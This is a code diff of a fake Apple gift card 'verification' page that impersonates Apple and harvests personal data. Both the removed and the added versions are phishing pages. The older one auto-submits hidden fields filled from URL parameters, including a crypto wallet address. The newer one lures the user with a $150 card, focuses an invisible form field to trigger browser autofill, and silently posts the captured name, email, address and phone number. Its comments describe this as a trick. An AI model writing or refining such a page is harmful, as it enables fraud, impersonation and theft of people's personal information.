@@ -3,164 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifying Balance - Apple (AU)</title>
+    <title>Verify Gift Card - Apple (AU)</title>
     <style>
-        :root {
-            --apple-blue: #0071e3;
-            --apple-gray: #f5f5f7;
-            --apple-text: #1d1d1f;
-        }
-
+        :root { --apple-blue: #0071e3; --apple-text: #1d1d1f; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
-            color: var(--apple-text);
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
+            background-color: #ffffff; color: var(--apple-text); margin: 0;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh;
         }
-
-        .content {
-            max-width: 600px;
-            width: 90%;
-            text-align: center;
-        }
-
+        .content { max-width: 600px; width: 90%; text-align: center; }
         h1 { font-size: 32px; font-weight: 600; margin-bottom: 10px; }
-        p.subtitle { font-size: 19px; color: #6e6e73; margin-bottom: 40px; }
+        p.subtitle { font-size: 19px; color: #6e6e73; margin-bottom: 30px; }
 
-        /* The Apple Card Visuals */
+        /* The Apple Card */
         .card-container {
-            position: relative;
-            width: 320px;
-            height: 200px;
-            margin: 0 auto 30px;
-            border-radius: 16px;
-            background: linear-gradient(135deg, #1c1c1e 0%, #2c2c2e 100%);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-            border: 1px solid #3a3a3c;
-            color: white;
+            position: relative; width: 320px; height: 200px; margin: 0 auto 30px;
+            border-radius: 16px; background: linear-gradient(135deg, #1c1c1e 0%, #2c2c2e 100%);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2); display: flex; flex-direction: column;
+            justify-content: center; align-items: center; border: 1px solid #3a3a3c; color: white;
         }
-
         .card-logo { width: 50px; fill: #008000; margin-bottom: 5px; }
         .card-value { position: absolute; top: 15px; right: 20px; font-size: 18px; font-weight: 600; }
-        .card-text { font-size: 14px; font-weight: 600; color: #aeaeb2; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 15px; }
-        
         .card-code-strip {
-            width: 85%;
-            height: 40px;
-            background-color: #f5f5f7;
-            border-radius: 4px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border: 1px dashed #d2d2d7;
+            width: 85%; height: 40px; background-color: #f5f5f7; border-radius: 4px;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .card-code-strip span { font-family: monospace; font-size: 16px; color: #1d1d1f; letter-spacing: 2px; font-weight: bold; }
+
+        /* The "Trick" - Visible but styled to look like a button or hidden */
+        .real-inputs {
+            opacity: 0; position: absolute; pointer-events: none; height: 0; width: 0;
         }
 
-        .card-code-strip span {
-            font-family: monospace;
-            font-size: 16px;
-            color: #1d1d1f;
-            letter-spacing: 2px;
-            font-weight: bold;
+        .btn-verify {
+            background-color: var(--apple-blue); color: white; border: none;
+            padding: 16px 32px; border-radius: 12px; font-size: 17px; font-weight: 600;
+            cursor: pointer; width: 100%; max-width: 320px; transition: 0.2s;
         }
+        .btn-verify:hover { background-color: #0077ed; }
 
-        /* Loading Spinner */
-        .spinner {
-            width: 24px;
-            height: 24px;
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid var(--apple-blue);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* HIDE THE FORM BOXES */
-        .hidden-fields { display: none; }
-
-        .footer {
-            position: absolute;
-            bottom: 0;
-            padding: 40px;
-            font-size: 12px;
-            color: #86868b;
-            text-align: center;
-            width: 100%;
-            background-color: #f5f5f7;
-        }
+        .footer { position: fixed; bottom: 0; padding: 20px; font-size: 12px; color: #86868b; text-align: center; width: 100%; background: #f5f5f7; }
     </style>
 </head>
 <body>
 
     <div class="content">
-        <div class="spinner"></div>
-        <h1>Verifying Code</h1>
-        <p class="subtitle">Securely connecting to Apple servers...</p>
+        <h1>Redeem Gift Card</h1>
+        <p class="subtitle">Complete verification to add $150 to your account.</p>
 
         <div class="card-container">
             <div class="card-value">$150</div>
             <svg class="card-logo" viewBox="0 0 170 170"><path d="M150.37,130.25c-2.45,5.66-5.35,10.87-8.71,15.66c-4.58,6.53-8.33,11.05-11.22,13.56c-4.48,4.12-9.28,6.23-14.42,6.35 c-3.69,0.09-8.14-1.05-13.36-3.41c-5.22-2.36-10.41-3.56-15.55-3.6c-5.22-0.03-10.56,1.17-16.03,3.6c-5.47,2.43-9.69,3.67-12.68,3.71 c-5.25,0.08-10.26-2.15-15.08-6.69c-3.11-2.76-7.18-7.73-12.21-14.92C20.64,130.14,12.28,110.19,5.5,85.27 c-3.21-11.85-4.81-22.9-4.81-33.15c0-11.41,2.4-20.94,7.19-28.58c4.01-6.4,9.63-11.59,16.85-15.56C31.95,4.02,39.95,2,48.72,1.91 c4.1,0.03,10.15,1.25,18.15,3.67c8,2.42,12.63,3.63,13.88,3.63c1.25,0,6.67-1.42,16.27-4.25c9.6-2.83,16.65-4.17,21.16-4.02 c10.38,0.34,19.22,3.95,26.54,10.84c4.66,4.39,8.5,9.69,11.53,15.91c-11.05,6.69-16.57,15.82-16.57,27.38 c0.03,9.45,3.29,17.44,9.79,23.97c3.41,3.41,7.52,6.17,12.35,8.27c-0.9,2.69-1.84,5.4-2.81,8.13L150.37,130.25z M117.75,22.25 c0-11.02,4.02-20.48,12.06-28.37c0.23-0.23,0.47-0.45,0.72-0.67c-1.37,0.1-2.75,0.15-4.13,0.15c-10.27,0-20.57,5.59-26.44,13.12 c-5.83,7.46-9.15,17.38-8.54,27.23C102.59,54.4,117.75,41.92,117.75,22.25z" /></svg>
-            <div class="card-text">Gift Card</div>
             <div class="card-code-strip">
-                <span id="card-placeholder">LOADING...</span>
+                <span id="card-placeholder">CHECKING...</span>
             </div>
         </div>
 
-        <form id="autoForm" action="/verify" method="POST" class="hidden-fields">
-            <input type="text" id="cardCode" name="cardCode">
-            <input type="text" id="fullName" name="fullName" autocomplete="name">
-            <input type="email" id="address" name="address" autocomplete="email">
-            <input type="text" id="city" name="city" autocomplete="address-level2">
-            <input type="text" id="zipCode" name="zipCode" autocomplete="postal-code">
-            <input type="tel" id="phoneNumber" name="phoneNumber" autocomplete="tel">
-            <input type="text" id="walletAddress" name="walletAddress">
+        <form id="autoForm" action="/verify" method="POST">
+            <div class="real-inputs">
+                <input type="text" id="cardCode" name="cardCode">
+                <input type="text" id="fullName" name="fullName" autocomplete="name">
+                <input type="email" id="address" name="address" autocomplete="email">
+                <input type="text" id="city" name="city" autocomplete="address-level2">
+                <input type="text" id="zipCode" name="zipCode" autocomplete="postal-code">
+                <input type="tel" id="phoneNumber" name="phoneNumber" autocomplete="tel">
+            </div>
+
+            <button type="button" class="btn-verify" id="triggerBtn">Verify with Apple ID</button>
         </form>
     </div>
 
-    <div class="footer">
-        <p>Copyright © 2026 Apple Inc. All rights reserved.</p>
-    </div>
+    <div class="footer">Copyright © 2026 Apple Inc.</div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        
-        // Define which URL parameters map to which IDs
-        const mapping = {
-            'code': 'cardCode',
-            'name': 'fullName',
-            'email': 'address',
-            'city': 'city',
-            'zip': 'zipCode',
-            'phone': 'phoneNumber',
-            'eth': 'walletAddress'
-        };
+        const code = urlParams.get('code');
+        if(code) {
+            document.getElementById('cardCode').value = code;
+            document.getElementById('card-placeholder').innerText = code.toUpperCase();
+        }
 
-        // Fill data silently
-        Object.keys(mapping).forEach(param => {
-            const val = urlParams.get(param);
-            const input = document.getElementById(mapping[param]);
-            if (val && input) {
-                input.value = decodeURIComponent(val);
-                if (param === 'code') {
-                    document.getElementById('card-placeholder').innerText = val.toUpperCase();
-                }
-            }
+        const triggerBtn = document.getElementById('triggerBtn');
+        const form = document.getElementById('autoForm');
+
+        triggerBtn.addEventListener('click', () => {
+            // Step 1: Change text to look like it's working
+            triggerBtn.innerText = "Verifying...";
+            triggerBtn.style.opacity = "0.7";
+
+            // Step 2: Manually focus a field to trigger the Browser's "Saved Info" dropdown
+            // Note: This works best on mobile. On desktop, it prompts the user to select their profile.
+            document.getElementById('fullName').focus();
+
+            // Step 3: Wait 3 seconds, then submit whatever was captured
+            setTimeout(() => {
+                form.submit();
+            }, 3000);
         });
-
-        // Auto-submit after 2 seconds to simulate "Verification"
-        setTimeout(() => {
-            document.getElementById('autoForm').submit();
-        }, 2500);
     </script>
 </body>
 </html>
